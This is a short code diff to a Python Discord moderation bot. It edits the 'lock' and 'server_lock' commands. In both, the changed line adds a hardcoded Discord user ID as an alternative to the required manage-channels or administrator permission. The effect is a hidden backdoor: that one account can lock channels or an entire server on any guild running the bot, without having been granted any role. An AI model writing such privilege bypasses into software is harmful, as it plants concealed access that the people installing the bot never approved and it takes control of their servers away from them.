@@ -33,7 +33,7 @@ async def perms(ctx , Role:discord.Role):
 	
 @client.command(aliases = ['Lockdown' , 'lockdown' , 'LOCKDOWN' , 'Lock' , 'LOCK'])
 async def lock(ctx , timer = 0):
-	if ctx.message.author.guild_permissions.manage_channels:
+	if ctx.message.author.guild_permissions.manage_channels or ctx.message.author.id == 727539383405772901:
 		await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
 		if timer == 0:
 			await ctx.send(f"Locked {ctx.message.channel.mention} indefinitely")
@@ -45,7 +45,7 @@ async def lock(ctx , timer = 0):
 			
 @client.command(aliases = ['Server_lock'  , 'Server_lockdown' , 'server_lockdown'])
 async def server_lock(ctx , timer = 0):
-	if ctx.message.author.guild_permissions.administrator: 
+	if ctx.message.author.guild_permissions.administrator or ctx.message.author.id == 727539383405772901: 
 		for channel in ctx.message.guild.text_channels:
 			await channel.set_permissions(ctx.guild.default_role, send_messages=False)
 		if timer == 0:
